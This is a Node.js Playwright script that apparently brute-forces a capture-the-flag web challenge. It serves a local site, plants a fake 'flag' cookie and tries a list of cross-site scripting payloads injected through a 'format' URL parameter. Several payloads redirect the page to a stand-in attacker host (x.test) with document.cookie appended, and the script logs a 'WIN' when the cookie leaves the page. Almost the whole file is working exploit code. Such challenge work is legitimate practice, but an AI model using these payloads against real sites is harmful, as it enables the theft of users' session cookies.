const http = require("http");
const fs = require("fs");
const path = require("path");
const { chromium } = require("playwright");
const SITE = path.join(__dirname, "site");
const PORT = 8099;
const COOKIE = "FLAGMARK_abc123";

const server = http.createServer((req, res) => {
  let p = decodeURIComponent(req.url.split("?")[0]);
  if (p === "/") p = "/index.html";
  fs.readFile(path.join(SITE, p), (err, data) => {
    if (err) { res.writeHead(200,{"Content-Type":"text/html"}); return res.end(fs.readFileSync(path.join(SITE,"index.html"))); }
    const ext = path.extname(p);
    res.writeHead(200,{"Content-Type":ext===".js"?"text/javascript":ext===".css"?"text/css":"text/html"});
    res.end(data);
  });
});
const q = o => Object.entries(o).map(([k,v])=>k+"="+encodeURIComponent(v)).join("&");

(async () => {
  await new Promise(r => server.listen(PORT, r));
  const browser = await chromium.launch();
  const ctx = await browser.newContext();
  await ctx.addCookies([{ name:"flag", value:COOKIE, url:`http://localhost:${PORT}`, httpOnly:false }]);

  async function test(format, formula){
    const page = await ctx.newPage();
    const egress = [];
    page.on("dialog", d => { egress.push("DIALOG:"+d.message().slice(0,80)); d.dismiss().catch(()=>{}); });
    await page.route("**", route => {
      const u = route.request().url();
      if (u.startsWith(`http://localhost:${PORT}`)) return route.continue();
      egress.push(u.slice(0,160)); return route.abort();
    });
    const url = `http://localhost:${PORT}/?` + q({x:"1",y:"2",formula:formula||"x + y",format:format,autoEval:"1"});
    try { await page.goto(url,{waitUntil:"domcontentloaded",timeout:8000}); } catch(e){}
    await page.waitForTimeout(900);
    let answer=""; try{ answer=await page.$eval("#answer",e=>e.textContent);}catch(e){answer="(navigated)";}
    await page.close();
    const win = egress.some(e=>e.includes(COOKIE));
    return {format, answer:(answer||"").slice(0,40), egress, win};
  }

  const B = "http://x.test/?c=";
  const payloads = [
    [`,[location="${B}"]+document.cookie`, null],
    [`,document.cookie+[location="${B}"]`, null],
    [`,[a="${B}"]+[location=a]+document.cookie`, null],
    [`,[name="${B}"]+[location=name]`, null],
    [`,[location=document.cookie]`, null],
    [`,[location=name]`, null],
    [`,[cookie="cookie"]+[location=document]`, null],
    // use values.formula (unrestricted) as the URL, navigate to it:
    [`,[location=values]`, B],
    [`,[b=values]+[location=b]`, B],
    // formula as full evil url incl nothing dynamic:
    [`,[location="${B}FIXED"]`, null],
    // try concat into location via name build then location=name (name gets base only):
    [`,[name="${B}"]+document.cookie+[location=name]`, null],
    // navigator.sendBeacon / fetch with this (junk) just to see egress host:
    [`,navigator.sendBeacon`, null],
    [`,fetch`, null],
    // open with selected as name (url=this junk):
    [`,open`, null],
    // try building via + then location assign trailing:
    [`,[location="${B}"]`, null],
  ];
  console.log("===== BRUTE (observe egress URLs) =====");
  for (const [f,fo] of payloads){
    const r = await test(f,fo);
    console.log((r.win?"WIN ":"    ") + JSON.stringify(r));
  }
  await browser.close(); server.close();
})();
